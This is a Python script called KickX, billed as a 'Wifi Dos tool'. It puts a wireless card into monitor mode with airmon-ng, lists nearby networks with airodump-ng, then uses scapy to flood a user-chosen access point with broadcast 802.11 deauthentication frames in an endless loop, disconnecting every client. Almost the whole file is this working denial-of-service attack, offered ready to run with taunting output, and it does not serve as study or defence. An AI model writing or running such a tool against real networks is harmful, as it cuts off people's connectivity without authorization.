import os,sys,socket,datetime,time,threading
from scapy.all import *
import subprocess
from subprocess import *
from colorama import Fore
cards = []

red = Fore.RED
green = Fore.GREEN
cyan = Fore.CYAN
reset = Fore.RESET
yellow = Fore.YELLOW

card = []
banner = """
██╗  ██╗██╗ ██████╗██╗  ██╗██╗  ██╗
██║ ██╔╝██║██╔════╝██║ ██╔╝╚██╗██╔╝
█████╔╝ ██║██║     █████╔╝  ╚███╔╝ 
██╔═██╗ ██║██║     ██╔═██╗  ██╔██╗ 
██║  ██╗██║╚██████╗██║  ██╗██╔╝ ██╗
╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝



	[+] KickX    : Wifi Dos tool
	[+] Coded By : Saadad Jahan Khan (Mr.V3n0m)
	[+] Email    : thesaadad1234@gmail.com
	[+] Facebook : Saadad Jahan Khan
	[+] Github   : @saadadjahankhan
	[+] Instagram: heysaadad
	[+] Twitter  : KhanSaadad
"""
subprocess.call("clear",)
print(red+banner+reset)
def listCards():
	result = subprocess.Popen("airmon-ng", stdout=PIPE).communicate()
	result = result[0].decode("utf-8")
	print(yellow+f"""
Choose Network Interface To Work With:
{result}
"""+reset)

def chooseAndStart():
	cardName = input(green+"[+] Enter Interface name: "+cyan)
	print(yellow+f"[!] Interface {cardName} selected,Starting Monitor Mode"+reset)
	command = f"airmon-ng start {cardName}"
	command = str(command)
	os.system(command)
	print(yellow+"[+] Monitor Mode Started..."+reset)
	print(cyan+"[!] Listing Available Networks to Dos"+reset)
	card.append(cardName)


def listNets(card):
	for iface in card:
		command = f"airodump-ng {iface}mon"
		command = str(command)
		print(f"""
Networks Near You

""")
	
	os.system(command)
def sprint(text):
	for word in text+"\n":
		sys.stdout.write(word)
		sys.stdout.flush()
		time.sleep(20./100)

def mrVenom(my_mac,Ap_mac,pktcount,card):
	for iface in card:
		iface = iface+"mon"
	try:
		while True:
			pkt = RadioTap() / Dot11(addr1=my_mac, addr2=Ap_mac, addr3=Ap_mac)/ Dot11Deauth()
			sendp(pkt, iface = iface, count = 10, inter = .001)
			print(yellow+"[~] Kicking Off these bustrads"+reset)
			
	
	except KeyboardInterrupt:
		os.system(f"airmon-ng stop {iface}")
		os.system("clear")





listCards()
chooseAndStart()
listNets(card)
Ap_mac = input(red+"[!] Target BSSID: "+cyan)
my_mac = "ff:ff:ff:ff:ff:ff"
pktcount = input(red+"[?] How Many Packets to send: "+cyan)
os.system("clear")
print(red+f"""

Target = {Ap_mac}
Packet Count = {pktcount}

""")
sprint("Ready...?")
sprint("Set...")
sprint("Here We Go...")

mrVenom(my_mac,Ap_mac,pktcount,card)












